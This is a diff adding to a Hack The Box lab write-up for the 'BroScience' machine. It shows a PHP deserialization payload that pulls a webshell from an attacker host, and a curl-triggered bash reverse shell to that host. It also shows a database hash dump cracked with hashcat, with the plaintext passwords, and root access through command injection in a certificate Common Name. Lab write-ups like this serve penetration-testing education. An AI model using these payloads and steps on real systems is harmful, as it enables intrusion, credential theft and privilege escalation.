@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/broscience.png
-tags: ["HTB"]
+tags: ["HTB", "php", "file-read", "directory-traversal", "filter", "wfuzz", "dotdotpwn", "psql", "postgresql", "php-deserialization", "deserialization", "hashcat", "command-injection", "openssl"]
 ---
 
 # BroScience
@@ -500,7 +500,7 @@ if (isset($_GET['code'])) {
 
 ![](./images/6.png)
 
-![](./images/8.png)
+![](./images/7.png)
 
 - Now, we have our session
 ```
@@ -508,7 +508,257 @@ if (isset($_GET['code'])) {
 O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";} 
 ```
 
+- Script the generate a payload
+  - `deserialize` will call `__wakeup`
+    - Which will create a new `Avatar` and call it's `save` function
+    - Whice will save the content of the `tmp` to `imgPath`
+    - So my server will host `tmp` file with webshell
+    - It 
+```
+<?php
+class Avatar {
+    public $imgPath;
+
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
+    }
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
+}
+ 
+class AvatarInterface {
+    public $tmp;
+    public $imgPath; 
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}
+ 
+
+$a = new AvatarInterface();
+$a->tmp = "http://10.10.16.4/shell.php";
+$a->imgPath = "./shell.php";
+echo base64_encode(serialize($a)) . "\n";
+?>
+```
+
+- Generate a payload
+```
+└─$ php broscience_payload.php                                                                                                    
+TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyNzoiaHR0cDovLzEwLjEwLjE2LjQvc2hlbGwucGhwIjtzOjc6ImltZ1BhdGgiO3M6MTE6Ii4vc2hlbGwucGhwIjt9
+```
+
+- Now change the `user-prefs` cookie and refresh the page
+  - My server receives the connection
+  - Check the webshell
+    - It works
+
+![](./images/8.png)
+
+![](./images/9.png)
+
+- Get reverse shell
+
+```
+└─$ curl https://broscience.htb/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.4/6666%200%3E%261%27
+```
+
+![](./images/10.png)
 
 ## User
+- We can't access `bill`'s directory
+  - Let's check database, since we had credentials from `LFI`
+```
+www-data@broscience:/var/www$ psql -U dbuser -d broscience -h localhost
+Password for user dbuser: 
+psql (13.9 (Debian 13.9-0+deb11u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
 
+broscience=> \list
+                                  List of databases
+    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
+------------+----------+----------+-------------+-------------+-----------------------
+ broscience | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+ template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+(4 rows)
+
+broscience=> \d
+                List of relations
+ Schema |       Name       |   Type   |  Owner   
+--------+------------------+----------+----------
+ public | comments         | table    | postgres
+ public | comments_id_seq  | sequence | postgres
+ public | exercises        | table    | postgres
+ public | exercises_id_seq | sequence | postgres
+ public | users            | table    | postgres
+ public | users_id_seq     | sequence | postgres
+(6 rows)
+
+broscience=> select * from users;
+ id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
+----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
+  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
+  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
+  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
+  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
+  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
+(5 rows)
+
+```
+
+- I wasn't able to crack the hash because it was salted
+  - If we check `db_connect.php` we have an entry `$db_salt = "NaCl"`
+  - If we check the `register.php`, we could see that hash is generated as `md5($db_salt . $_POST['password'])`
+    - Copy hashes from db using `select username || ':' || password || ':NaCl' from users;`
+```
+broscience=> select username || ':' || password || ':NaCl' from users;
+                      ?column?                       
+-----------------------------------------------------
+ administrator:15657792073e8a843d4f91fc403454e1:NaCl
+ bill:13edad4932da9dbb57d9cd15b66ed104:NaCl
+ michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
+ john:a7eed23a7be6fe0d765197b1027453fe:NaCl
+ dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl
+(5 rows)
+```
+```
+└─$ hashcat -m 20 hash /usr/share/wordlists/rockyou.txt --user
+hashcat (v6.2.6) starting
+<SNIP>
+13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym    
+5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest     
+bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples 
+```
+```
+└─$ hashcat -m 20 hash /usr/share/wordlists/rockyou.txt --user --show
+ bill:13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
+ michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
+ dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
+```
+
+- Now we can `su`
+```
+www-data@broscience:/var/www$ su - bill
+Password: 
+bill@broscience:~$ 
+
+```
 ## Root
+- No `sudo` rights
+  - Let's upload `pspy`
+  - We see a `cron` job
+
+![](./images/11.png)
+
+- Content of the script
+```
+bill@broscience:/tmp$ cat /opt/renew_cert.sh
+#!/bin/bash
+
+if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
+    echo "Usage: $0 certificate.crt";
+    exit 0;
+fi
+
+if [ -f $1 ]; then
+
+    openssl x509 -in $1 -noout -checkend 86400 > /dev/null
+
+    if [ $? -eq 0 ]; then
+        echo "No need to renew yet.";
+        exit 1;
+    fi
+
+    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
+
+    country=$(echo $subject | grep -Eo 'C = .{2}')
+    state=$(echo $subject | grep -Eo 'ST = .*,')
+    locality=$(echo $subject | grep -Eo 'L = .*,')
+    organization=$(echo $subject | grep -Eo 'O = .*,')
+    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
+    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
+    emailAddress=$(openssl x509 -in $1 -noout -email)
+
+    country=${country:4}
+    state=$(echo ${state:5} | awk -F, '{print $1}')
+    locality=$(echo ${locality:3} | awk -F, '{print $1}')
+    organization=$(echo ${organization:4} | awk -F, '{print $1}')
+    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
+    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')
+
+    echo $subject;
+    echo "";
+    echo "Country     => $country";
+    echo "State       => $state";
+    echo "Locality    => $locality";
+    echo "Org Name    => $organization";
+    echo "Org Unit    => $organizationUnit";
+    echo "Common Name => $commonName";
+    echo "Email       => $emailAddress";
+
+    echo -e "\nGenerating certificate...";
+    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
+    $state
+    $locality
+    $organization
+    $organizationUnit
+    $commonName
+    $emailAddress
+    " 2>/dev/null
+
+    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
+else
+    echo "File doesn't exist"
+    exit 1;
+
+```
+
+- `/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"` uses `$commonName`
+  - Which is set 2 times:
+    - `commonName=$(echo $subject | grep -Eo 'CN = .*,?')` - regex
+    - `commonName=$(echo ${commonName:5} | awk -F, '{print $1}')` - 
+  - We can try to generate a certificate and set `commandName` with command we want to execute
+    - `cp /bin/bash /tmp/pwn; chmod 4755 /tmp/pwn`
+  - We also have to bypass the check `openssl x509 -in $1 -noout -checkend 86400`, which check if certificate expires within 1 day
+```
+bill@broscience:~$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out Certs/broscience.crt -days 1
+Generating a RSA private key
+..............................++++
+........................................................................++++
+writing new private key to '/tmp/temp.key'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:$(chmod 4777 /bin/bash)
+Email Address []:
+```
+
+- After few minutes we have `root`
+```
+bill@broscience:~$ ls -lha /bin/bash
+-rwsrwxrwx 1 root root 1.2M Mar 27  2022 /bin/bash
+bill@broscience:~$ /bin/bash -p
+bash-5.1# whoami
+root
+```
